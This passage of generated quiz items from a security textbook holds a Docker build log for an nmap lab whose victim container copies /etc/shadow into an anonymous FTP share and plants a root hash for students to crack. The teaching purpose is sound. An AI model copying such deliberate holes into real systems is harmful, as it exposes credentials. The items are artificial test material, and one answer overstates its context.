text states that an attacker can set their MAC address to that of another machine to initiate a MitM attack.", "question_token_count": 31, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 10, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the importance of implementing proper security controls for internet-facing services.", "question": "Based on the provided context, what specific security vulnerabilities were identified on the `victim` machine, and how does nmap\u2019s `-A` option contribute to a more comprehensive understanding of these vulnerabilities?", "answer": "The `victim` machine has a default ProFTPD installation with a weak root password, indicating a significant security risk. Nmap\u2019s `-A` option reveals the OS and service versions, allowing for targeted vulnerability assessment.", "explanation": "The context reveals that the `victim` machine is running ProFTPD with a default configuration and a weak root password. Nmap\u2019s `-A` option provides OS and service detection, revealing the OS and allowing for a deeper analysis of the potential attack surface.", "question_token_count": 41, "answer_correctness_score": 8, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 46, "choices": null}
{"context": "### 5.5.6. XML Injection {#_computer_systems_security_planning_for_success.xhtml__xml_injection}\nXML stands for extensible markup language, and it is often used to transfer messages. XML can be an important part of a\n\nweb systems infrastructure and as such if unsanitized user inputs are allowed to generate XML the is used in the system\n\nmany things can go wrong. Using XML injection an attacker may be able to retrieve secret files or create admin accounts.\n\nXML injection can be mitigated by input validation or possibly disabling the resolution of external entities in the\n\nframework being used.\n\n:::\n\n::: {.section .sect3 title=\"5.5.7. LDAP Injection\"}\n\n\n### 5.5.7. LDAP Injection {#_computer_systems_security_planning_for_success.xhtml__ldap_injection}\nFinally, Lightweight Directory Access Protocol (LDAP) is often used to store information about users. As such, it can be\n\nfound behind many web applications. LDAP also supports complex queries in a similar fashion to SQL. An unsantized user\n\ninput can lead to a LDAP query with unexpected results.\n\n:::\n\n::: {.section .sect3 title=\"5.5.8. Directory Traversal\"}\n", "topic": "What are the potential consequences of an attacker successfully exploiting an XML injection vulnerability within a web system?", "question": "What specific types of sensitive data or system functionalities could be compromised by an attacker leveraging an XML injection vulnerability?", "answer": "Secret files and administrative accounts.", "explanation": "The text explicitly states that successful XML injection can lead to the retrieval of secret files and the creation of administrative accounts, representing critical system compromises.", "question_token_count": 22, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "### 9.5.12. Command and Control {#_computer_systems_security_planning_for_success.xhtml__command_and_control}\nCommand and Control (C2 or C&C) refers to the process of setting up a channel between the compromised internal systems\n\nand an external system. This channel can be used to get data off the compromised machines and/or for putting malware on\n\nthe machines. A C2 channel allows the operator to send interact with the compromised machines and even automate much of\n\nthe work.\n\nC2 protocols may try to piggyback on regular network traffic, or make use of services that are hard to trace. You'll see\n\nencrypted C2 traffic on web protocols, DNS queries, mail protocols, or even chat protocols such as Discord. Lower level\n\nprotocols like ICMP and UDP can also be used to avoid detection. C2 systems may make use of multiple channels or\n\ndifferent channels for uploads/downloads. The ultimate goal is to make the traffic hard to detect, trace, and stop.\n\n:::\n\n::: {.section .sect3 title=\"9.5.13. Exfiltration\"}\n\n\n### 9.5.13. Exfiltration {#_computer_systems_security_planning_for_success.xhtml__exfiltration}\nGetting the data off of a machine can be difficult for an adversary as large transfers may trigger alarms. Web services\n\nthat are already used, Google Drive, Dropbox, etc., may be employed to make exfiltration look like regular traffic. In\n\nthe case of a physical breach, USB drives may be employed. Finally radio protocols like Bluetooth, cellular, or local\n\nWiFi may also be used if the attacker is in close proximity to the device.\n\n:::\n\n::: {.section .sect3 title=\"9.5.14. Impact\"}\n", "topic": "C2 protocols often utilize encrypted channels on standard network protocols (e.g., web, DNS, mail) or lower-level protocols (e.g., ICMP, UDP) to evade detection.", "question": "Beyond simply listing protocols, how does the use of seemingly benign services like Google Drive or Dropbox contribute to the effectiveness of data exfiltration strategies within a C2 framework?", "answer": "By mimicking legitimate network traffic.", "explanation": "The passage states adversaries utilize services like Google Drive and Dropbox for exfiltration, mimicking legitimate traffic. This demonstrates a sophisticated approach to concealment by leveraging existing, trusted communication pathways.", "question_token_count": 35, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 10, "avg_answer_token_count": 8, "choices": null}
{"context": "### 7.3.6. ACLs {#_computer_systems_security_planning_for_success.xhtml__acls}\nAccess Control Lists (ACL) are used to permit or deny access based on a characteristic. They tend to be based on a\n\nsimple characteristic and either deny access to anyone not on the list, *allowlist*, or deny access to anyone who *is*\n\non the list, *denylist*.\n\nACLs used in networking and typically filter based on IP address. You can find examples of ACLs in most firewall\n\nproducts as well as in Amazon Web Services (AWS) Virtual Private Cloud (VPC).\n\nFilesystem ACLs apply the same concept to files. Linux uses fileystem ACLs to permit or deny access in a more nuanced\n\nway than possible with [Unix File\n\nPermissions](#_computer_systems_security_planning_for_success.xhtml__unix_file_permissions){#_computer_systems_security_planning_for_success.xhtml_xref-_unix_file_permissions\n\n.xref}.\n\n:::\n\n::: {.section .sect3 title=\"7.3.7. SSH Keys\"}\n\n\n### 7.3.7. SSH Keys {#_computer_systems_security_planning_for_success.xhtml__ssh_keys}\nSecure Shell Server (SSH) supports the use of asymmetric encryption keys for authentication. Most severs support RSA,\n\nDSA, and ECDSA keys, with RSA being the most common. An SSH server maintains a list of authorized keys, typically in\n\n`~/.ssh/authorized_keys`{.literal}, that can be used to connect to the server. When a client connects, the SSH server\n\nissues a challenge asking the client to sign a random piece of data using their private key. If the private key matches\n\nthe public key stored in the `authorized_keys`{.literal} file, the user is logged in.\n\nSSH keys have the advantage of being easier to use as the user doesn't need to remember and type in a password. For this\n\nreason, keys are often used for authentication when running protocols over SSH such a\n\n[git](https://git-scm.com/){.link}. Keys also have the advantage of possibly thwarting MitM attacks. While a password\n\ncan be easily stolen by a malicious actor impersonating an SSH server, authentication via key will only transmit a\n\nsigned bit of random data. This bit of data is useless to the MitM.\n\n:::\n\n::: {.section .sect3 title=\"7.3.8. Sessions and Cookies\"}\n", "topic": "The location of authorized SSH keys, typically in the `~/.ssh/authorized_keys` file, is a key element of the authentication process.", "question": "Where does an SSH server typically store a list of authorized keys for authentication?", "answer": "~/.ssh/authorized_keys", "explanation": "The text explicitly states that the `~/.ssh/authorized_keys` file is used for this purpose.", "question_token_count": 16, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "### 4.4.9. DNS {#_computer_systems_security_planning_for_success.xhtml__dns}\nDomain Name System (DNS) is used to resolve domain names to IP addresses. Domain names are the simple names people are\n\naccustomed to for websites, such as `njit.edu`{.literal} as opposed to `54.83.189.142`{.literal}. Names are\n\nsignificantly easier for people to remember than IP addresses. In order for a computer to resolve a name, it first\n\nqueries a local cache, then its primary DNS server. Assuming the DNS server cannot find the name it will query a Root\n\nserver for a Top Level Domain (TLD) server, which maintains a listing of Authoritative Nameservers for that particular\n\ndomain (edu, com, net, org, gov, etc.). Finally once an authoritative nameserver is found it will respond with the IP\n\naddress for that particular hostname which will be cached and sent back through the user's primary DNS server to the\n\nuser.\n\nDNS is designed to be resilient and decentralized but unfortunately the traffic is not authenticated or encrypted. This\n\nhas made it a target for MitM attacks. Likewise cache hits and misses [can yield information as to what names have been\n\nrecently resolved](https://kb.isc.org/docs/aa-00509){.link} (as was the case in discovering the extent of the Sony\n\nRootkit). The recursive nature has of DNS has also allowed for DoS attacks in the past, but much of that has been solved\n\nby limiting recursive queries to the user-facing DNS servers (ie. the one given to you by your DHCP request). DNS\n\noperates via UDP (and occasionally TCP) on port 53.\n\n:::\n\n::: {.section .sect3 title=\"4.4.10. DNSSEC\"}\n", "topic": "Summarize the methods implemented to mitigate DoS attacks against DNS, focusing on limiting recursive queries.", "question": "How has the operational design of DNS been modified to address the vulnerability of DoS attacks, and what specific mechanism was implemented to achieve this mitigation?", "answer": "Limiting recursive queries to user-facing DNS servers.", "explanation": "The text states that DoS attacks were mitigated by limiting recursive queries to the user-facing DNS servers.", "question_token_count": 30, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 11, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP 